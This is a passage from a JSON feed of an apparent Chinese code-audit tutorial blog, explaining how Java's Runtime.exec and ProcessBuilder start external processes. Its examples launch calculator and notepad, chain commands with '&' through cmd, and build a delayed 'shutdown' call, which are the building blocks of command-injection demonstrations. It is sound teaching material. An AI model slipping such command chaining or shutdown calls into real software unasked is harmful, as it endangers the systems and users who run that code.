      "content_html": "\n<p>Java调用外部可执行程序或系统命令，主要有以下两种调用方式</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token number\">1</span>、<span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>exec\n\n<span class=\"token number\">2</span>、<span class=\"token keyword\">new</span> <span class=\"token class-name\">ProcessBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre></div><h2>1、Runtime</h2>\n<h3>1.1 简介</h3>\n<p><code>Runtime.getRuntime().exec</code>用于调用外部可执行程序或系统命令，并重定向外部程序的标准输入、标准输出和标准错误到缓冲池。功能和windows“运行”类似。</p>\n<ul>\n<li><code>Runtime</code>是一个单例的实例</li>\n<li><code>Runtime</code>运行应用程序与运行应用程序的环境进行交互</li>\n<li><code>Runtime</code>是Java运行时环境，应用程序不能创建属于自己的实例，需要通过<code>getRuntime()</code>方法获取</li>\n</ul>\n<p>调用方式如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">private</span> <span class=\"token class-name\">Process</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> command<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> runtime<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> process<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><code>command</code>是要执行的命令，<code>Runtime.getRuntime()</code>返回当前应用程序的<code>Runtime</code>对象，该对象的<code>exec()</code>方法指示Java虚拟机创建一个子进程执行指定的可执行程序，并返回与该子进程对应的<code>Process</code>对象实例。通过<code>Process</code>可以控制该子进程的执行或获取该子进程的信息。<code>Procss</code>类将持有该程序返回Java VM的引用。这个<code>Procss</code>类是一个抽象类，具体子类的实现依赖于不同的底层操作系统。</p>\n<blockquote>\n<p><code>Runtime.exec()</code>不是<code>cmd</code>或<code>shell</code>环境，因此无法直接调用<code>dir</code>等命令，需要在程序中读取运行的操作系统平台，以调用不同的命令解释器（NT：cmd.exe，windows 95/98：command.exe，linux：/bin/sh）</p>\n</blockquote>\n<h3>1.2 方法API</h3>\n<p><code>Runtime.getRuntime().exec</code>共有六个重载方法：</p>\n<ol>\n<li><code>public Process exec(String command)</code>// 在单独的进程中执行指定的外部可执行程序的启动路径或字符串命令</li>\n<li><code>public Process exec(String[] cmdArray)</code>// 在单独的进程中执行指定命令和变量</li>\n<li><code>public Process exec(String command, String[] envp)</code>// 在指定环境的独立进程中执行指定命令和变量</li>\n<li><code>public Process exec(String[] cmdArray, String[] envp)</code>// 在指定环境的独立进程中执行指定的命令和变量</li>\n<li><code>public Process exec(String command, String[] envp, File dir)</code>// 在指定环境和工作目录的独立进程中执行指定的字符串命令</li>\n<li><code>public Process exec(String[] cmdarray, String[] envp, File dir)</code>// 在指定环境和工作目录的独立进程中执行指定的命令和变量</li>\n</ol>\n<p><code>cmdarray</code>：包含所调用命令及其参数的数组。数组第一个元素是命令，其余是参数\n<code>envp</code>：字符串数组，其中每个元素的环境变量的设置格式为 name=value，如果子进程应该继承当前进程的环境，则该参数为null\n<code>dir</code>：子进程的工作目录；如果子进程应该继承当前进程的工作目录，则该参数为null</p>\n<p>参数<code>cmdArray</code>示例：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"shutdown\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"-s\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"-t\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3600\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>注意：在调用这个方法时，不能将命令和参数放在一起，eg：<code>String arr[] = {\"shutdown -s -t 3600\"};</code>这样会导致程序把<code>“shutdown -s -t 3600”</code>当成是一条命令的名称，然后去查找<code>“shutdown -s -t 3600”</code>这条命令，它当然会找不到，所以就会报错。</p>\n<p>具体示例：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InputStream</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/10/17 21:43\n * @Description :\n */</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">RuntimeTest</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        runtime<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"&amp;\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"notepad\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        runtime<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd /c calc &amp; notepad\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        runtime<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd.exe /k calc &amp; notepad\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        runtime<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"cmd.exe\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/k\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"&amp;\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"notepad\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Process</span> start <span class=\"token operator\">=</span> runtime<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ping www.baidu.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        start<span class=\"token punctuation\">.</span><span class=\"token function\">waitFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">InputStream</span> inputStream <span class=\"token operator\">=</span> start<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> res <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token number\">1024</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        inputStream<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> <span class=\"token string\">\"GBK\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span>\n<span class=\"token comment\">//        test1();</span>\n<span class=\"token comment\">//        test2();</span>\n<span class=\"token comment\">//        test3();</span>\n<span class=\"token comment\">//        test4();</span>\n        <span class=\"token function\">test5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h2>2、ProcessBuilder</h2>\n<h3>2.1 简介</h3>\n<p><code>ProcessBuilder</code>类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法，是J2SE 1.5在<code>java.lang</code>中新添加的一个新类，之前都是由Process类处理实现进程的控制管理。</p>\n<p>每个<code>ProcessBuilder</code>实例管理一个进程属性集合。<code>start()</code>方法使用这些属性创建一个新的流程实例。可以从同一个实例多次调用start()方法，以创建具有相同或相关属性的新子进程。<code>ProcessBuilder</code>的构造方法接收一个命令参数的数组形式，其中，第一个元素代表要执行的系统命令，后面的元素代表要传给该命令的参数。</p>\n<p>例如</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">BufferedReader</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InputStreamReader</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">PrintStream</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>nio<span class=\"token punctuation\">.</span>charset<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">StandardCharsets</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ArrayList</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">List</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/10/17 22:12\n * @Description :\n */</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ProcessBuilderTest</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span> cmd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cmd<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"python\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        cmd<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"D:/test.py\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ProcessBuilder</span> pb <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ProcessBuilder</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 合并 错误流和标准流</span>\n        pb<span class=\"token punctuation\">.</span><span class=\"token function\">redirectErrorStream</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> pb<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printResults</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">printResults</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Process</span> process<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">BufferedReader</span> reader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">InputStreamReader</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"GBK\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> line <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>line <span class=\"token operator\">=</span> reader<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>test.py如下</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code><span class=\"token keyword\">import</span> os\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">runcmd</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    result <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> result\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    result <span class=\"token operator\">=</span> runcmd<span class=\"token punctuation\">(</span><span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">)</span> \n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>\n</code></pre></div><p>运行结果</p>\n<figure><figcaption>image-20231017224619085</figcaption></figure>\n<p>或者cmd改成ipconfig</p>\n<figure><figcaption>image-20231017231030708</figcaption></figure>\n<h3>2.2 方法API</h3>\n<p>构造方法</p>\n<ul>\n<li>\n<p><code>ProcessBuilder(List&lt;String&gt; command) </code>利用指定的操作系统程序和参数构造一个进程生成器。</p>\n</li>\n<li>\n<p><code>ProcessBuilder(String… command) </code>利用指定的操作系统程序和参数构造一个进程生成器。</p>\n</li>\n<li>\n<p>方法摘要\n<code>command() </code>返回此进程生成器的操作系统程序和参数。设置此过程构建器的操作系统程序和参数。此方法不会复制命令列表。该列表的后续更新将反映在流程构建器的状态中。不检查命令是否对应于有效的操作系统命令。</p>\n</li>\n<li>\n<p><code>command(List&lt;String&gt; command) </code>设置此进程生成器的操作系统程序和参数。</p>\n</li>\n<li>\n<p><code>command(String… command) </code>设置此进程生成器的操作系统程序和参数。</p>\n</li>\n<li>\n<p><code>directory() </code>返回此进程生成器的工作目录。</p>\n</li>\n<li>\n<p><code>directory(File directory) </code>设置此进程生成器的工作目录。</p>\n</li>\n<li>\n<p><code>environment() </code>返回此进程生成器环境的字符串映射视图。 environment方法获得运行进程的环境变量,得到一个Map,可以修改环境变量</p>\n</li>\n<li>\n<p><code>redirectErrorStream() </code>通知进程生成器是否合并标准错误和标准输出。如果该属性为真，则由该对象的<code>start()</code>方法启动的子进程生成的任何错误输出都将与标准输出合并，以便两者都可以使用<code>Process.getInputStream()</code>方法读取。这使得将错误消息与相应的输出关联起来更容易,而从 <code>Process.getErrorStream()</code>返回的流读取将直接到达文件尾，初始值为false。</p>\n</li>\n<li>\n<p><code>redirectErrorStream(boolean redirectErrorStream) </code>设置此进程生成器的 redirectErrorStream 属性。</p>\n</li>\n<li>\n<p><code>start()</code>使用此进程生成器的属性启动一个新进程。</p>\n</li>\n</ul>\n<p>完整例子：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ProcessBuilderTest</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span> params <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        params<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        params<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-jar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        params<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ProcessJar.jar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        params<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"args1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        params<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"args2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        params<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"args3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">ProcessBuilder</span> processBuilder <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ProcessBuilder</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        System.out.println(processBuilder.directory());</span>\n<span class=\"token comment\">//        System.out.println(processBuilder.environment());</span>\n        processBuilder<span class=\"token punctuation\">.</span><span class=\"token function\">redirectErrorStream</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> processBuilder<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">BufferedReader</span> br <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">InputStreamReader</span><span class=\"token punctuation\">(</span>process<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">String</span> line<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>line <span class=\"token operator\">=</span> br<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">int</span> exitCode <span class=\"token operator\">=</span> process<span class=\"token punctuation\">.</span><span class=\"token function\">waitFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exitCode = \"</span><span class=\"token operator\">+</span>exitCode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "4-JNDI",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/4-JNDI.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/4-JNDI.html",
